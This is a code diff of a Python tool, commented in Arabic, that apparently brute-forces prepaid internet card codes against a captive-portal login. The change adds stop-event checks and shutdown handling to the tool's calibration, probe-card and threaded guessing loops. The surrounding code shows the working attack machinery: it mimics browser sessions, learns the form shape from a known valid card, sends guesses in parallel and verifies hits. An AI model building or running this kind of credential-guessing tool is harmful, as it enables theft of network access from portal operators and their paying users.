@@ -459,7 +459,8 @@ def bench_cards(p: dict, count: int = 3, seed: int = 0, exclude=()) -> list:  # 
 # أي خطوة تفشل ⇒ cal.error ولا يبدأ التخمين.
 def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعريف الدالة calibrate(profile, known_card, keyword, learn_known, log, checks, probes, preflight_only) ترجع Calibration
               learn_known: bool = True, log=None, checks=None,  # مفتاح learn_known في القاموس
-              probes: int = 3, preflight_only: bool = False) -> Calibration:  # مفتاح probes في القاموس
+              probes: int = 3, preflight_only: bool = False,
+              stop_event=None) -> Calibration:
     p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
     cal = Calibration()  # إسناد نتيجة استدعاء Calibration إلى cal
     cal.profile = p  # إسناد p إلى cal.profile
@@ -481,6 +482,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
                   "charset": p.get("charset", "")[:40]})  # مفتاح charset في القاموس
         return cal  # إرجاع cal
 
+    if stop_event is not None and stop_event.is_set():
+        cal.error = "user_stop"
+        return cal
     session = new_session(headers=browser_headers(p, p["login_url"]))  # إسناد نتيجة استدعاء new_session (headers=…) إلى session
 
     try:  # بدايةtry محمية (يليها except/finally)
@@ -504,6 +508,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
         # يشير إليها، وإلا فالشكل الذي يجده الضابط أدناه سيُكتب
         # في قاموس لم يعد أحد يقرؤه
         cal.profile = p  # إسناد p إلى cal.profile
+        if stop_event is not None and stop_event.is_set():
+            cal.error = "user_stop"
+            return cal
 
         # --- 1ب. هل الباب مغلق أصلاً؟ --------------------------------
         # صفحة ما زالت تعرض نموذج الدخول ليست صفحة حجب، حتى لو
@@ -541,6 +548,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
                  else f"internet_{state.lower()}",  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                  {**{k: v for k, v in cal.internet.items() if k != "state"},  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                   "state": state})  # مفتاح state في القاموس
+        if stop_event is not None and stop_event.is_set():
+            cal.error = "user_stop"
+            return cal
 
         # استخدم البطاقة المعروفة المُعطاة صراحةً مرة واحدة، بالشكل
         # المرصود حالياً للطلب، قبل إرسال أي تخمينات معايرة.
@@ -558,6 +568,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
                 known_preflight_response = _known_card_preflight(  # المعامل المسمّى known_preflight_response
                     p, known_card, session, cal.internet, checks=checks)  # تكملة السطر السابق داخل القوس
             cal.profile = p  # إسناد p إلى cal.profile
+            if stop_event is not None and stop_event.is_set():
+                cal.error = "user_stop"
+                return cal
             if known_preflight.get("code") == "NET_ERROR":  # شرط: known_preflight.get('code') يساوي 'NET_ERROR'
                 cal.error = known_preflight.get("reason") or "network_error"  # دمج منطقي (أو) وإسناده إلى cal.error
                 cal.step("shape_tuned", False, f"net_{cal.error}",  # استدعاء cal.step (4 معاملات)
@@ -596,6 +609,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
         for card in bench_cards(  # دورة على bench_cards(p, max(2, min(int(probes أو 2), 4)), exclude=مجموعة إن known_card وإلا مجموعة) باسم card
                 p, max(2, min(int(probes or 2), 4)),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                 exclude=(known_card,) if known_card else ()):  # المعامل المسمّى exclude
+            if stop_event is not None and stop_event.is_set():
+                cal.error = "user_stop"
+                return cal
             try:  # بدايةtry محمية (يليها except/finally)
                 r = send_login(session, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى r
             # تكملة السطر السابق داخل القوس
@@ -624,6 +640,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
             p = absorb_form(p, r.text or "", r.url or p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى p
             cal.profile = p  # إسناد p إلى cal.profile
 
+        if stop_event is not None and stop_event.is_set():
+            cal.error = "user_stop"
+            return cal
         if not replies:  # شرط معكوس: ليس replies
             # تعذّر بناء أي بطاقة تجريبية، أو ماتت كلها: بلا خط أساس
             # سيبدو أي شيء «غير مرفوض»، وسيرفع التشغيل تقارير
@@ -700,7 +719,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
                 p, known_card, fp, session, checks=checks,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                 internet_before=cal.internet,  # المعامل المسمّى internet_before
                 initial_trials=preflight_trials,  # المعامل المسمّى initial_trials
-                skip_shape=skip_shape)  # المعامل المسمّى skip_shape
+                skip_shape=skip_shape, stop_event=stop_event)  # المعامل المسمّى skip_shape
             cal.profile = p  # إسناد p إلى cal.profile
             if words:  # شرط: words
                 cal.success_words = words  # إسناد words إلى cal.success_words
@@ -749,7 +768,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",  # تعر�
 
 def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,  # تعريف الدالة _tune_with_known_card(p, known_card, fp, session, checks, internet_before, initial_trials, skip_shape)
                           checks=None, internet_before=None, initial_trials=None,  # المعامل المسمّى checks
-                          skip_shape=None):  # المعامل المسمّى skip_shape
+                          skip_shape=None, stop_event=None):  # المعامل المسمّى skip_shape
     # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
     """Try the sensible (password value x dst) combinations for the good card.
 
@@ -790,6 +809,8 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session, 
 
     remaining = max(0, config.KNOWN_CARD_TRIAL_LIMIT - len(trials))  # إسناد نتيجة استدعاء max (2 معاملات) إلى remaining
     for method, dst, mode, send_dst, send_popup in candidates[:remaining]:  # دورة على candidates[] باسم مجموعة
+        if stop_event is not None and stop_event.is_set():
+            break
         trial = dict(p)  # إسناد نتيجة استدعاء dict (معامل واحد) إلى trial
         trial["pass_mode"] = mode  # إسناد mode إلى trial['pass_mode']
         trial["dst_value"] = dst  # إسناد dst إلى trial['dst_value']
@@ -1347,9 +1368,26 @@ class Engine:  # تعريف الصنف Engine
             }  # إغلاق القوس المفتوح في السطر السابق
 
     def stop(self, reason: str = "user_stop") -> None:  # تعريف الدالة stop(self, reason) ترجع None
-        if not self.stop_reason:  # شرط معكوس: ليس self.stop_reason
-            self.stop_reason = reason  # إسناد reason إلى self.stop_reason
+        with self.lock:
+            if not self.stop_reason:
+                self.stop_reason = reason
+            active = self.state in ("calibrating", "running")
+            if active:
+                self.state = "stopping"
         self.stop_event.set()  # استدعاء self.stop_event.set
+        if active:
+            self.emit("state", {"state": "stopping", "stop_reason": self.stop_reason})
+
+    def _finish_stopped(self, calibration=None) -> None:
+        if calibration is not None:
+            self.calibration = calibration.as_dict()
+            self.emit("calibration", self.calibration)
+        if not self.stop_reason:
+            self.stop_reason = "user_stop"
+        self.state = "done"
+        self.finished_at = time.time()
+        self._save_report()
+        self.emit("state", {"state": "done", "stop_reason": self.stop_reason})
 
     def _wait(self, seconds: float) -> bool:  # تعريف الدالة _wait(self, seconds) ترجع bool
         # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
@@ -1367,7 +1405,7 @@ class Engine:  # تعريف الصنف Engine
               keyword: str = "", known_card: str = "", verify_after: bool = True,  # مفتاح keyword في القاموس
               auto_stop: bool = True, resume: bool = True,  # مفتاح auto_stop في القاموس
               preflight_only: bool = False) -> dict:  # مفتاح preflight_only في القاموس
-        if self.state == "running":  # شرط: self.state يساوي 'running'
+        if self.state in ("calibrating", "running", "stopping"):
             return {"ok": False, "error": "already_running"}  # إرجاع قاموس
         p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
         if not resume:  # شرط معكوس: ليس resume
@@ -1444,19 +1482,32 @@ class Engine:  # تعريف الصنف Engine
     def _run(self, p, attempts, threads, delay_ms, keyword, known_card,  # تعريف الدالة _run(self, p, attempts, threads, delay_ms, keyword, known_card, preflight_only) ترجع None
              preflight_only=False) -> None:  # المعامل المسمّى preflight_only
         try:  # بدايةtry محمية (يليها except/finally)
+            if self.stop_event.is_set():
+                self._finish_stopped()
+                return
             cal = calibrate(p, known_card=known_card, keyword=keyword,  # إسناد نتيجة استدعاء calibrate (معامل واحد، known_card=…، keyword=…، checks=…، probes=…، preflight_only=…) إلى cal
                             checks=self.checks,  # المعامل المسمّى checks
                             probes=config.CALIBRATION_PROBES,  # المعامل المسمّى probes
-                            preflight_only=preflight_only)  # المعامل المسمّى preflight_only
+                            preflight_only=preflight_only,
+                            stop_event=self.stop_event)  # المعامل المسمّى preflight_only
+            if self.stop_event.is_set():
+                self._finish_stopped(cal)
+                return
             if not cal.ok and calibration_retryable(cal.error):  # شرط مركّب (و)
                 # عثرة واحدة يجب ألا تكلّف المستخدم التشغيل كله
                 self.emit("note", {"message": "retrying_learning",  # استدعاء self.emit (2 معاملات)
                                    "after": cal.error})  # مفتاح after في القاموس
-                time.sleep(1.0)  # استدعاء time.sleep (معامل واحد)
+                if self.stop_event.wait(1.0):
+                    self._finish_stopped(cal)
+                    return
                 cal = calibrate(p, known_card=known_card, keyword=keyword,  # إسناد نتيجة استدعاء calibrate (معامل واحد، known_card=…، keyword=…، checks=…، probes=…، preflight_only=…) إلى cal
                                 checks=self.checks,  # المعامل المسمّى checks
                                 probes=config.CALIBRATION_PROBES,  # المعامل المسمّى probes
-                                preflight_only=preflight_only)  # المعامل المسمّى preflight_only
+                                preflight_only=preflight_only,
+                                stop_event=self.stop_event)  # المعامل المسمّى preflight_only
+                if self.stop_event.is_set():
+                    self._finish_stopped(cal)
+                    return
             known_card_failure = False  # إسناد القيمة الثابتة known_card_failure
             if known_card:  # شرط: known_card
                 shape_step = next((item for item in cal.steps  # إسناد نتيجة استدعاء next (2 معاملات) إلى shape_step
@@ -1466,6 +1517,9 @@ class Engine:  # تعريف الصنف Engine
                     cal.error = shape_step.get("reason") or "known_card_not_proven"  # دمج منطقي (أو) وإسناده إلى cal.error
             self.calibration = cal.as_dict()  # إسناد نتيجة استدعاء cal.as_dict إلى self.calibration
             self.emit("calibration", self.calibration)  # استدعاء self.emit (2 معاملات)
+            if self.stop_event.is_set():
+                self._finish_stopped()
+                return
             if not cal.ok or known_card_failure:  # شرط مركّب (أو)
                 self.state, self.error = "done", cal.error or "calibration_failed"  # إسناد مجموعة إلى مجموعة
                 self.stop_reason = "calibration_failed"  # إسناد القيمة الثابتة self.stop_reason
@@ -1490,8 +1544,18 @@ class Engine:  # تعريف الصنف Engine
             else:  # مفتاح else في القاموس
                 self.plan["effective_threads"] = int(threads)  # إسناد نتيجة استدعاء int (معامل واحد) إلى self.plan['effective_threads']
             judge = cal.judge  # إسناد cal.judge إلى judge
-            self.state = "running"  # إسناد القيمة الثابتة self.state
-            self.emit("state", {"state": "running"})  # استدعاء self.emit (2 معاملات)
+            with self.lock:
+                if self.stop_event.is_set() or self.state == "stopping":
+                    cancelled = True
+                else:
+                    cancelled = False
+                    self.state = "running"
+                    self.seq += 1
+                    self.events.append({"seq": self.seq, "t": round(time.time(), 3),
+                                        "kind": "state", "data": {"state": "running"}})
+            if cancelled:
+                self._finish_stopped()
+                return
             self._start_watchdog()  # استدعاء self._start_watchdog
 
             space = store.space_size(self.profile)  # إسناد نتيجة استدعاء store.space_size (معامل واحد) إلى space
@@ -1517,7 +1581,8 @@ class Engine:  # تعريف الصنف Engine
                 # المتصفح يطلب الصفحة دائماً قبل أن يُرسل: خذ الكوكي
                 # والحقول المخفية التي توزعها البوابة،
                 # واطلبها مجدداً بين حين وآخر (الرموز تنتهي والجلسات تتحرك)
-                live = warm_up(sess, self.profile)  # إسناد نتيجة استدعاء warm_up (2 معاملات) إلى live
+                live = (warm_up(sess, self.profile)
+                        if not self.stop_event.is_set() else None)
                 since = 0  # إسناد القيمة الثابتة since
                 try:  # بدايةtry محمية (يليها except/finally)
                     while not self.stop_event.is_set():  # حلقة ما دام نفي/سالب
@@ -1534,6 +1599,10 @@ class Engine:  # تعريف الصنف Engine
                                 with self.lock:  # سياق مُدار: self.lock
                                     self._retry_processed += 1  # تحديث self._retry_processed بعملية جمع
                             if live is None:  # شرط: live هو نفسه None
+                                if self.stop_event.is_set():
+                                    with self.lock:
+                                        self._unevaluated += 1
+                                    continue
                                 # لا صفحة لدينا وبالتالي لا جلسة:
                                 # حاول مرة أخرى قبل إنفاق بطاقة على
                                 # طلب سترفضه البوابة
@@ -1553,7 +1622,8 @@ class Engine:  # تعريف الصنف Engine
                             if (config.WARMUP_EVERY > 0 and  # شرط مركّب (و)
                                     since >= config.WARMUP_EVERY):  # تكملة تعريف متعدد الأسطر
                                 # تجديد يفشل يُبقي الصفحة التي لدينا
-                                live = warm_up(sess, live) or live  # دمج منطقي (أو) وإسناده إلى live
+                                if not self.stop_event.is_set():
+                                    live = warm_up(sess, live) or live
                                 since = 0  # إسناد القيمة الثابتة since
                             since += 1  # تحديث since بعملية جمع
                             self._attempt(sess, judge, item[0], item[1], live)  # استدعاء self._attempt (5 معاملات)
@@ -1647,7 +1717,9 @@ class Engine:  # تعريف الصنف Engine
                         self.progress["dropped"] = \
                             self.progress.get("dropped", 0) + dropped  # تكملة السطر السابق داخل القوس
                 for w in list((self._pool or {"threads": workers})["threads"]):  # دورة على list(self._pool أو قاموس['threads']) باسم w
-                    w.join(timeout=5.0)  # استدعاء w.join (timeout=…)
+                    # Do not report the run as done while a worker still has an
+                    # in-flight portal request or session cleanup to finish.
+                    w.join()
 
             # تذكّر كم وصلنا، حتى يُكمل التشغيل التالي بدل
             # أن يبدأ من جديد. تُحسب فقط البطاقات التي وصلتها إجابة فعلاً:
@@ -1723,16 +1795,24 @@ class Engine:  # تعريف الصنف Engine
     def _attempt(self, sess, judge, card: str, sent_index: int,  # تعريف الدالة _attempt(self, sess, judge, card, sent_index, profile) ترجع None
                  profile: dict = None) -> None:  # مفتاح profile في القاموس
         if self.stop_event.is_set():  # شرط: نتيجة self.stop_event.is_set()
+            with self.lock:
+                self._unevaluated += 1
             return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
         p = profile or self.profile  # دمج منطقي (أو) وإسناده إلى p
         sess.read_timeout = config.ATTACK_READ_TIMEOUT  # إسناد config.ATTACK_READ_TIMEOUT إلى sess.read_timeout
         delay = self.throttle["delay_ms"] / 1000.0  # حساب قسمة بين self.throttle['delay_ms'] و1000.0 وإسناده إلى delay
-        if delay > 0:  # شرط: delay أكبر من 0
-            time.sleep(delay)  # استدعاء time.sleep (معامل واحد)
+        if delay > 0 and self.stop_event.wait(delay):
+            with self.lock:
+                self._unevaluated += 1
+            return
         started = time.time()  # إسناد نتيجة استدعاء time.time إلى started
         resp = None  # إسناد القيمة الثابتة resp
         last_err = None  # إسناد القيمة الثابتة last_err
         for attempt in range(3):        # أعد فقط عثرات النقل الحقيقية
+            if self.stop_event.is_set():
+                with self.lock:
+                    self._unevaluated += 1
+                return
             try:  # بدايةtry محمية (يليها except/finally)
                 resp = send_login(sess, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى resp
                 break  # قطع الحلقة فوراً
@@ -1741,7 +1821,10 @@ class Engine:  # تعريف الصنف Engine
                 err = classify(exc, p.get("login_url", ""))  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
                 last_err = err  # إسناد err إلى last_err
                 if err.retryable and attempt < 2:  # شرط مركّب (و)
-                    time.sleep(0.06 * (attempt + 1))  # استدعاء time.sleep (معامل واحد)
+                    if self.stop_event.wait(0.06 * (attempt + 1)):
+                        with self.lock:
+                            self._unevaluated += 1
+                        return
                     continue  # الانتقال إلى الدورة التالية
                 break  # قطع الحلقة فوراً
 
@@ -1771,7 +1854,7 @@ class Engine:  # تعريف الصنف Engine
                 profile.clear()  # استدعاء profile.clear
                 profile.update(fresh)  # استدعاء profile.update (معامل واحد)
                 p = profile  # إسناد profile إلى p
-        if verdict.is_hit and self.verify_enabled:  # شرط مركّب (و)
+        if verdict.is_hit and self.verify_enabled and not self.stop_event.is_set():
             verdict = self._verify_hit(sess, verdict, card)  # إسناد نتيجة استدعاء self._verify_hit (3 معاملات) إلى verdict
 
         with self.lock:  # سياق مُدار: self.lock
